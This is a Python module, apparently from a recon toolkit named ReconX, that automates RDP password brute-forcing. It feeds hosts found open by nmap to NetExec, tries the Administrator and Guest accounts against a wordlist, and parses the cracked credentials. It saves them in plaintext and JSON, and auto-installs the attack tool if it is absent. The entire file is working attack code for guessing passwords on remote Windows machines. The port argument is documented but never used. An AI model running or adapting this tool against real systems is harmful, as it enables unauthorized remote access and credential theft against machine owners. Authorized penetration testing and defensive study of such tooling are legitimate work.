"""
RDP Brute-force Scanner for ReconX.
Uses NetExec (nxc) to test default credentials against RDP services
discovered by nmap port scanning.

For each host with RDP port (3389) open, tests:
  - Administrator with wordlists/enum-pass.txt
  - Guest with wordlists/enum-pass.txt

Command:
  netexec rdp <IP> -u <user> -p wordlists/enum-pass.txt

Successful line example:
  RDP  192.168.101.15  3389  WIN-P9P4RUTL8EQ  [+] WIN-P9P4RUTL8EQ\\Administrator:P@ssw0rd (Pwn3d!)

Requires: netexec (nxc) or crackmapexec installed in PATH
  Install: pip install netexec
"""

import os
import re
import sys
import shutil
import subprocess
import time as _time
import json
from typing import List, Dict, Optional, Set
from dataclasses import dataclass, field

from ..config import ScannerConfig


# ─── Default usernames to test ───────────────────────────────────────────────

DEFAULT_RDP_USERS = ["Administrator", "Guest"]

# ─── RDP port(s) ─────────────────────────────────────────────────────────────

RDP_PORTS = {3389, 3390, 3391}  # Common RDP ports

# ─── Output parsing patterns ─────────────────────────────────────────────────

# Matches: RDP  IP  PORT  HOSTNAME  [+] DOMAIN\user:pass  (optional Pwn3d!)
SUCCESS_PATTERN = re.compile(
    r'\[\+\]\s+'
    r'(?:(\S+?)\\)?'       # Optional domain\  (group 1)
    r'(\S+?)'              # Username           (group 2)
    r':'                   # Separator
    r'(\S+)'               # Password           (group 3)
    r'(?:\s+\(Pwn3d!\))?', # Optional Pwn3d! flag
    re.IGNORECASE,
)

# Matches: [*] Windows 10 or Windows Server 2016 Build 20348 (name:HOSTNAME) (domain:DOMAIN)
INFO_PATTERN = re.compile(
    r'\[\*\]\s+(.+?)\s+\(name:(\S+?)\)\s+\(domain:(\S+?)\)',
    re.IGNORECASE,
)

# Account lockout / disabled detection
LOCKOUT_PATTERNS = [
    re.compile(r'STATUS_ACCOUNT_LOCKED_OUT', re.IGNORECASE),
    re.compile(r'STATUS_ACCOUNT_DISABLED', re.IGNORECASE),
    re.compile(r'account.*locked', re.IGNORECASE),
    re.compile(r'account.*disabled', re.IGNORECASE),
]

# Rate limit / connection failure
RATE_LIMIT_PATTERNS = [
    re.compile(r'connection.*refused', re.IGNORECASE),
    re.compile(r'connection.*timed?\s*out', re.IGNORECASE),
    re.compile(r'connection.*reset', re.IGNORECASE),
    re.compile(r'too many', re.IGNORECASE),
    re.compile(r'NLA.*required', re.IGNORECASE),
]


# ─── Data classes ─────────────────────────────────────────────────────────────

@dataclass
class RDPCredential:
    """A successfully brute-forced RDP credential."""
    ip: str = ""
    username: str = ""
    password: str = ""
    domain: str = ""
    port: int = 3389
    hostname: str = ""
    pwned: bool = False   # True if (Pwn3d!) flag present

    def to_dict(self) -> dict:
        d = {
            "ip": self.ip,
            "username": self.username,
            "password": self.password,
            "port": self.port,
            "pwned": self.pwned,
        }
        if self.domain:
            d["domain"] = self.domain
        if self.hostname:
            d["hostname"] = self.hostname
        return d


@dataclass
class RDPHostResult:
    """Brute-force result for a single RDP host."""
    ip: str = ""
    port: int = 3389
    hostname: str = ""
    os_info: str = ""
    users_tested: List[str] = field(default_factory=list)
    credentials: List[RDPCredential] = field(default_factory=list)
    skipped: bool = False
    skip_reason: str = ""
    scan_time: float = 0.0
    raw_output: str = ""

    def to_dict(self) -> dict:
        d = {
            "ip": self.ip,
            "port": self.port,
            "users_tested": self.users_tested,
            "credentials": [c.to_dict() for c in self.credentials],
            "scan_time": self.scan_time,
        }
        if self.hostname:
            d["hostname"] = self.hostname
        if self.os_info:
            d["os_info"] = self.os_info
        if self.skipped:
            d["skipped"] = True
            d["skip_reason"] = self.skip_reason
        return d


@dataclass
class RDPBruteStats:
    """Aggregated RDP brute-force statistics."""
    total_rdp_hosts: int = 0
    hosts_tested: int = 0
    hosts_skipped: int = 0
    total_users_tested: int = 0
    credentials_found: int = 0
    pwned_count: int = 0
    scan_time: float = 0.0

    def to_dict(self) -> dict:
        return {
            "total_rdp_hosts": self.total_rdp_hosts,
            "hosts_tested": self.hosts_tested,
            "hosts_skipped": self.hosts_skipped,
            "total_users_tested": self.total_users_tested,
            "credentials_found": self.credentials_found,
            "pwned_count": self.pwned_count,
            "scan_time": self.scan_time,
        }


class RDPBruteScanner:
    """
    RDP brute-force scanner using NetExec (nxc).

    After nmap discovers hosts with RDP port open,
    tests default usernames (Administrator, Guest) with wordlists/enum-pass.txt.
    """

    DEFAULT_PASS_FILE = os.path.join("wordlists", "enum-pass.txt")

    def __init__(self, config: ScannerConfig, pass_file: str = ""):
        self.config = config
        self.pass_file = pass_file or self.DEFAULT_PASS_FILE
        self.nxc_path = self._find_nxc()
        self.available = self.nxc_path is not None
        self.results: Dict[str, RDPHostResult] = {}
        self.stats = RDPBruteStats()

    def _find_nxc(self) -> Optional[str]:
        """Find netexec (nxc) or crackmapexec binary in PATH."""
        # Try nxc/netexec first (newer), then crackmapexec
        for name in ["nxc", "netexec", "crackmapexec", "cme"]:
            found = shutil.which(name)
            if found:
                return found

        # Common install locations
        common_paths = [
            os.path.expanduser("~/.local/bin/nxc"),
            os.path.expanduser("~/.local/bin/netexec"),
            os.path.expanduser("~/.local/bin/crackmapexec"),
            "/usr/local/bin/nxc",
            "/usr/local/bin/netexec",
            "/usr/local/bin/crackmapexec",
            "/usr/bin/nxc",
            "/usr/bin/netexec",
            "/usr/bin/crackmapexec",
        ]

        for path in common_paths:
            if os.path.isfile(path):
                return path

        # Auto-install netexec if not found
        from .auto_install import ensure_tool
        if ensure_tool("nxc"):
            return shutil.which("nxc") or shutil.which("netexec")

        return None

    def _find_pass_file(self, output_dir: str = "") -> Optional[str]:
        """
        Locate the password file. Search order:
          1. Exact path if absolute
          2. Current working directory
          3. Output directory
          4. Package directory (scanner/)
          5. Parent directory (reconx/)
          6. Project root
        """
        if os.path.isabs(self.pass_file) and os.path.isfile(self.pass_file):
            return self.pass_file

        search_dirs = [
            os.getcwd(),
            output_dir,
            os.path.dirname(os.path.abspath(__file__)),
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
        ]

        for d in search_dirs:
            if not d:
                continue
            candidate = os.path.join(d, self.pass_file)
            if os.path.isfile(candidate):
                return os.path.abspath(candidate)

        return None

    def _get_rdp_hosts(self, nmap_results: Dict) -> Dict[str, int]:
        """
        Extract hosts with RDP ports open from nmap results.

        Args:
            nmap_results: Dict[str, NmapHostResult] from nmap scanner.

        Returns:
            Dict mapping IP → RDP port number.
        """
        rdp_hosts = {}
        for ip, host_result in nmap_results.items():
            ports = []
            if hasattr(host_result, 'ports'):
                ports = host_result.ports
            elif isinstance(host_result, dict):
                ports = host_result.get('ports', [])

            for port_entry in ports:
                port_num = port_entry.port if hasattr(port_entry, 'port') else port_entry.get('port', 0)
                state = port_entry.state if hasattr(port_entry, 'state') else port_entry.get('state', '')
                service = port_entry.service if hasattr(port_entry, 'service') else port_entry.get('service', '')

                if state == "open" and (port_num in RDP_PORTS or "rdp" in service.lower() or "ms-wbt-server" in service.lower()):
                    rdp_hosts[ip] = port_num
                    break  # One RDP port per host is enough

        return rdp_hosts

    def scan(
        self,
        nmap_results: Dict,
        output_dir: str = "",
        users: Optional[List[str]] = None,
    ) -> Dict[str, RDPHostResult]:
        """
        Run RDP brute-force against hosts with port 3389 open.

        Args:
            nmap_results: Dict[str, NmapHostResult] from nmap scanner.
            output_dir: Directory to save output files.
            users: List of usernames to test (default: Administrator, Guest).

        Returns:
            Dict mapping IP → RDPHostResult.
        """
        if not self.available:
            return {}

        if not nmap_results:
            return {}

        # Find RDP hosts
        rdp_hosts = self._get_rdp_hosts(nmap_results)
        if not rdp_hosts:
            return {}

        # Locate password file
        pass_file_path = self._find_pass_file(output_dir)
        if not pass_file_path:
            print(
                f"\033[91m[!]\033[0m rdp-brute: password file "
                f"'{self.pass_file}' not found – skipping"
            )
            return {}

        test_users = users or DEFAULT_RDP_USERS

        scan_start = _time.time()
        self.results = {}
        total_users_tested = 0

        self.stats.total_rdp_hosts = len(rdp_hosts)

        print(
            f"\033[36m[>]\033[0m rdp-brute: testing "
            f"\033[92m{len(rdp_hosts)}\033[0m RDP host(s) with "
            f"\033[96m{', '.join(test_users)}\033[0m + "
            f"\033[96m{os.path.basename(pass_file_path)}\033[0m ..."
        )

        for ip in sorted(rdp_hosts.keys()):
            rdp_port = rdp_hosts[ip]
            host_start = _time.time()
            host_result = RDPHostResult(ip=ip, port=rdp_port)

            for username in test_users:
                host_result.users_tested.append(username)
                total_users_tested += 1

                output = self._run_nxc_rdp(ip, rdp_port, username, pass_file_path)
                host_result.raw_output += output + "\n"

                # Parse host info
                info_match = INFO_PATTERN.search(output)
                if info_match:
                    host_result.os_info = info_match.group(1).strip()
                    host_result.hostname = info_match.group(2).strip()

                # Parse credentials
                creds = self._parse_success(ip, rdp_port, output)
                host_result.credentials.extend(creds)

                # Check lockout — skip remaining users
                if self._detect_lockout(output):
                    host_result.skipped = True
                    host_result.skip_reason = "account lockout detected"
                    print(
                        f"\033[93m[!]\033[0m rdp-brute: {ip} — lockout detected, "
                        f"skipping remaining users"
                    )
                    break

                # Check rate limit / connection issues
                if self._detect_rate_limit(output):
                    host_result.skipped = True
                    host_result.skip_reason = "connection error / rate limit"
                    print(
                        f"\033[93m[!]\033[0m rdp-brute: {ip} — connection issues, "
                        f"skipping remaining users"
                    )
                    break

            host_result.scan_time = _time.time() - host_start
            self.results[ip] = host_result

            # Print per-host result
            cred_count = len(host_result.credentials)
            if cred_count > 0:
                for cred in host_result.credentials:
                    domain_str = f"{cred.domain}\\" if cred.domain else ""
                    pwn_str = " \033[1;91m(Pwn3d!)\033[0m" if cred.pwned else ""
                    print(
                        f"\033[1;92m[+]\033[0m rdp-brute: "
                        f"\033[96m{ip}:{rdp_port}\033[0m → "
                        f"\033[1;92m{domain_str}{cred.username}:{cred.password}\033[0m"
                        f"{pwn_str}"
                    )
            elif host_result.skipped:
                pass  # Already printed skip message
            else:
                print(
                    f"\033[37m[-]\033[0m rdp-brute: "
                    f"{ip}:{rdp_port} — no valid credentials"
                )

        scan_elapsed = _time.time() - scan_start

        # Compute stats
        all_creds = self.get_all_credentials()
        self.stats.hosts_tested = len(self.results)
        self.stats.hosts_skipped = sum(1 for r in self.results.values() if r.skipped)
        self.stats.total_users_tested = total_users_tested
        self.stats.credentials_found = len(all_creds)
        self.stats.pwned_count = sum(1 for c in all_creds if c.pwned)
        self.stats.scan_time = scan_elapsed

        # Save results to output dir
        if output_dir:
            self._save_results(output_dir)

        return self.results

    def _run_nxc_rdp(
        self, ip: str, port: int, username: str, pass_file: str
    ) -> str:
        """
        Run: netexec rdp <IP> -p <port> -u <username> -p <pass_file>

        Returns the combined stdout+stderr output.
        """
        cmd = [
            self.nxc_path,
            "rdp",
            ip,
            "-u", username,
            "-p", pass_file,
            "--continue-on-success",
        ]

        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120,
                encoding="utf-8",
                errors="replace",
            )
            return (proc.stdout or "") + (proc.stderr or "")
        except subprocess.TimeoutExpired:
            return "[timeout]"
        except Exception as e:
            return f"[error: {e}]"

    def _parse_success(
        self, ip: str, port: int, output: str
    ) -> List[RDPCredential]:
        """Parse successful credentials from netexec output."""
        creds = []
        for line in output.splitlines():
            line = line.strip()
            if "[+]" not in line:
                continue
            # Skip informational [+] lines that don't look like creds
            if ":" not in line:
                continue

            m = SUCCESS_PATTERN.search(line)
            if m:
                domain = m.group(1) or ""
                username = m.group(2)
                password = m.group(3)
                pwned = "(Pwn3d!)" in line

                cred = RDPCredential(
                    ip=ip,
                    username=username,
                    password=password,
                    domain=domain,
                    port=port,
                    pwned=pwned,
                )
                # Deduplicate
                existing = {(c.username, c.password) for c in creds}
                if (username, password) not in existing:
                    creds.append(cred)

        return creds

    def _detect_lockout(self, output: str) -> bool:
        """Detect account lockout indicators."""
        for pat in LOCKOUT_PATTERNS:
            if pat.search(output):
                return True
        return False

    def _detect_rate_limit(self, output: str) -> bool:
        """Detect connection errors / rate limiting."""
        error_count = 0
        total_lines = 0
        for line in output.splitlines():
            line = line.strip()
            if not line:
                continue
            total_lines += 1
            for pat in RATE_LIMIT_PATTERNS:
                if pat.search(line):
                    error_count += 1
                    break
        # If more than 50% of output lines are errors, consider rate limited
        if total_lines > 0 and error_count / total_lines > 0.5:
            return True
        return False

    def _save_results(self, output_dir: str):
        """Save results to output directory."""
        os.makedirs(output_dir, exist_ok=True)

        # Plain-text credentials file
        cred_file = os.path.join(output_dir, "rdp_credentials.txt")
        lines = ["# ReconX - RDP Brute-force Results"]
        lines.append(f"# Hosts tested: {self.stats.hosts_tested}/{self.stats.total_rdp_hosts}")
        lines.append(f"# Credentials found: {self.stats.credentials_found}")
        lines.append(f"# Pwn3d: {self.stats.pwned_count}")
        lines.append(f"# Scan time: {self.stats.scan_time:.1f}s")
        lines.append("")

        for ip in sorted(self.results.keys()):
            hr = self.results[ip]
            lines.append(f"── {ip}:{hr.port} ──")
            if hr.hostname:
                lines.append(f"  Hostname: {hr.hostname}")
            if hr.os_info:
                lines.append(f"  OS: {hr.os_info}")
            lines.append(f"  Users tested: {', '.join(hr.users_tested)}")
            if hr.skipped:
                lines.append(f"  SKIPPED: {hr.skip_reason}")
            if hr.credentials:
                for cred in hr.credentials:
                    domain_str = f"{cred.domain}\\" if cred.domain else ""
                    pwn_str = " (Pwn3d!)" if cred.pwned else ""
                    lines.append(f"  [+] {domain_str}{cred.username}:{cred.password}{pwn_str}")
            else:
                lines.append("  No valid credentials found")
            lines.append("")

        with open(cred_file, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")

        # JSON summary
        json_file = os.path.join(output_dir, "rdp_brute_summary.json")
        json_data = {
            "stats": self.stats.to_dict(),
            "hosts": {
                ip: hr.to_dict() for ip, hr in self.results.items()
            },
        }
        with open(json_file, "w", encoding="utf-8") as f:
            json.dump(json_data, f, indent=2, ensure_ascii=False)
            f.write("\n")

    def get_all_credentials(self) -> List[RDPCredential]:
        """Return all discovered credentials across all hosts."""
        creds = []
        for hr in self.results.values():
            creds.extend(hr.credentials)
        return creds
